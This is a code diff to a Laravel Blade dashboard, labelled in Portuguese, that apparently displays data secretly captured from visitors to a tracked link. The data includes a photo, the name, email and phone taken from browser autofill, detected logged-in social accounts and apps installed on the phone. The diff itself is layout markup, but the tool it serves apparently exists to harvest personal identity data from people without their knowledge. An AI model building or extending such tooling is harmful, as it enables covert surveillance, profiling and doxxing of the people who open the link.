@@ -41,9 +41,13 @@
                     <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 24 24" stroke-width="1.8" stroke="currentColor" style="color:#6366f1">
                         <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 6a3.75 3.75 0 1 1-7.5 0 3.75 3.75 0 0 1 7.5 0ZM4.501 20.118a7.5 7.5 0 0 1 14.998 0A17.933 17.933 0 0 1 12 21.75c-2.676 0-5.216-.584-7.499-1.632Z" />
                     </svg>
-                    Identidade Digital
+                    Identidade Digital Capturada
                 </span>
             </x-slot>
+
+            <p class="mb-4 text-xs text-gray-500 dark:text-gray-400">
+                Exibe dados disponibilizados pelo navegador: autofill, conta Google quando acessível, indícios de contas logadas e apps detectados no celular. Perfis como Instagram podem aparecer apenas como “logado” ou “app instalado”, pois o navegador não informa o @usuário.
+            </p>
 
             {{-- Linha 1: dados pessoais --}}
             <dl class="grid grid-cols-1 gap-4 text-sm sm:grid-cols-3 mb-5">
@@ -174,7 +178,7 @@
                             <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200">Referer</th>
                             <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200">User-Agent</th>
                             <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200" style="color:#16a34a;min-width:80px;">📷 Foto</th>
-                            <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200" style="color:#6366f1;min-width:180px;">🪪 Identidade Digital</th>
+                            <th class="px-3 py-2 text-left font-semibold text-gray-700 dark:text-gray-200" style="color:#6366f1;min-width:340px;">🪪 Identidade Digital</th>
                         </tr>
                     </thead>
                     <tbody class="divide-y divide-gray-100 bg-white dark:divide-gray-800 dark:bg-gray-900">
@@ -242,44 +246,65 @@
                                 </td>
 
                                 {{-- Coluna Identidade Digital --}}
-                                <td class="px-3 py-2" style="min-width:220px;">
+                                <td class="px-3 py-2" style="min-width:340px;">
                                     @if ($acessoTemId)
-                                        <div style="display:flex;flex-direction:column;gap:4px;font-size:0.78rem;line-height:1.4;">
-                                            @if($acesso['identidade_nome'])
-                                                <span>👤 {{ $acesso['identidade_nome'] }}</span>
-                                            @endif
-                                            @if($acesso['identidade_email'])
-                                                <span>✉️ {{ $acesso['identidade_email'] }}</span>
-                                            @endif
-                                            @if($acesso['identidade_telefone'])
-                                                <span>📞 {{ $acesso['identidade_telefone'] }}</span>
+                                        <div style="display:flex;flex-direction:column;gap:8px;font-size:0.78rem;line-height:1.4;">
+                                            @if($acesso['identidade_nome'] || $acesso['identidade_email'] || $acesso['identidade_telefone'])
+                                                <div style="display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:6px;">
+                                                    <div style="padding:6px 8px;border-radius:8px;background:#f9fafb;border:1px solid #e5e7eb;">
+                                                        <div style="font-size:0.65rem;text-transform:uppercase;color:#6b7280;font-weight:700;">Nome</div>
+                                                        <div style="font-weight:600;color:#111827;word-break:break-word;">{{ $acesso['identidade_nome'] ?: '—' }}</div>
+                                                    </div>
+                                                    <div style="padding:6px 8px;border-radius:8px;background:#f9fafb;border:1px solid #e5e7eb;">
+                                                        <div style="font-size:0.65rem;text-transform:uppercase;color:#6b7280;font-weight:700;">E-mail</div>
+                                                        <div style="font-weight:600;color:#111827;word-break:break-word;">{{ $acesso['identidade_email'] ?: '—' }}</div>
+                                                    </div>
+                                                    <div style="padding:6px 8px;border-radius:8px;background:#f9fafb;border:1px solid #e5e7eb;">
+                                                        <div style="font-size:0.65rem;text-transform:uppercase;color:#6b7280;font-weight:700;">Telefone</div>
+                                                        <div style="font-weight:600;color:#111827;word-break:break-word;">{{ $acesso['identidade_telefone'] ?: '—' }}</div>
+                                                    </div>
+                                                </div>
                                             @endif
 
                                             {{-- Redes logadas --}}
-                                            @foreach($acessoRedesLogadas as $r)
-                                                @php
-                                                    $redeSemUser = ['Instagram','Twitter/X','LinkedIn','TikTok','Pinterest','Facebook'];
-                                                @endphp
-                                                <span style="color:#166534;font-weight:600;">
-                                                    🔐 {{ $r['rede'] }}:
-                                                    @if(!empty($r['usuario']))
-                                                        {{ $r['usuario'] }}
-                                                        @if(!empty($r['nome']))
-                                                            <span style="font-weight:400;color:#6b7280;">({{ $r['nome'] }})</span>
-                                                        @endif
-                                                    @elseif(in_array($r['rede'], $redeSemUser))
-                                                        <span style="font-weight:400;font-style:italic;" title="Username não acessível por restrições do browser">logado · sem username ⓘ</span>
-                                                    @else
-                                                        <span style="font-weight:400;font-style:italic;">logado</span>
-                                                    @endif
-                                                </span>
-                                            @endforeach
+                                            @if($acessoRedesLogadas->isNotEmpty())
+                                                <div style="padding:7px 8px;border-radius:8px;background:#f0fdf4;border:1px solid #bbf7d0;">
+                                                    <div style="font-size:0.65rem;text-transform:uppercase;color:#166534;font-weight:800;margin-bottom:5px;">Contas detectadas</div>
+                                                    <div style="display:flex;flex-wrap:wrap;gap:5px;">
+                                                        @foreach($acessoRedesLogadas as $r)
+                                                            @php
+                                                                $redeSemUser = ['Instagram','Twitter/X','LinkedIn','TikTok','Pinterest','Facebook'];
+                                                            @endphp
+                                                            <span style="display:inline-flex;align-items:center;gap:4px;padding:3px 7px;border-radius:9999px;background:#dcfce7;color:#166534;font-weight:700;">
+                                                                {{ $r['rede'] }}:
+                                                                @if(!empty($r['usuario']))
+                                                                    <span style="color:#14532d;">{{ $r['usuario'] }}</span>
+                                                                    @if(!empty($r['nome']))
+                                                                        <span style="font-weight:500;color:#4b5563;">({{ $r['nome'] }})</span>
+                                                                    @endif
+                                                                @elseif(in_array($r['rede'], $redeSemUser))
+                                                                    <span style="font-weight:500;" title="Perfil/username não é disponibilizado pelo navegador">logado, perfil indisponível</span>
+                                                                @else
+                                                                    <span style="font-weight:500;">logado</span>
+                                                                @endif
+                                                            </span>
+                                                        @endforeach
+                                                    </div>
+                                                </div>
+                                            @endif
 
                                             {{-- Apps instalados --}}
                                             @if($acessoAppsInstalados->isNotEmpty())
-                                                <span style="color:#3730a3;">
-                                                    📱 {{ $acessoAppsInstalados->pluck('rede')->implode(', ') }}
-                                                </span>
+                                                <div style="padding:7px 8px;border-radius:8px;background:#eef2ff;border:1px solid #c7d2fe;">
+                                                    <div style="font-size:0.65rem;text-transform:uppercase;color:#3730a3;font-weight:800;margin-bottom:5px;">Apps detectados no celular</div>
+                                                    <div style="display:flex;flex-wrap:wrap;gap:5px;">
+                                                        @foreach($acessoAppsInstalados as $app)
+                                                            <span style="display:inline-block;padding:3px 8px;border-radius:9999px;background:#e0e7ff;color:#3730a3;font-weight:700;">
+                                                                {{ $app['rede'] }}
+                                                            </span>
+                                                        @endforeach
+                                                    </div>
+                                                </div>
                                             @endif
                                         </div>
                                     @else
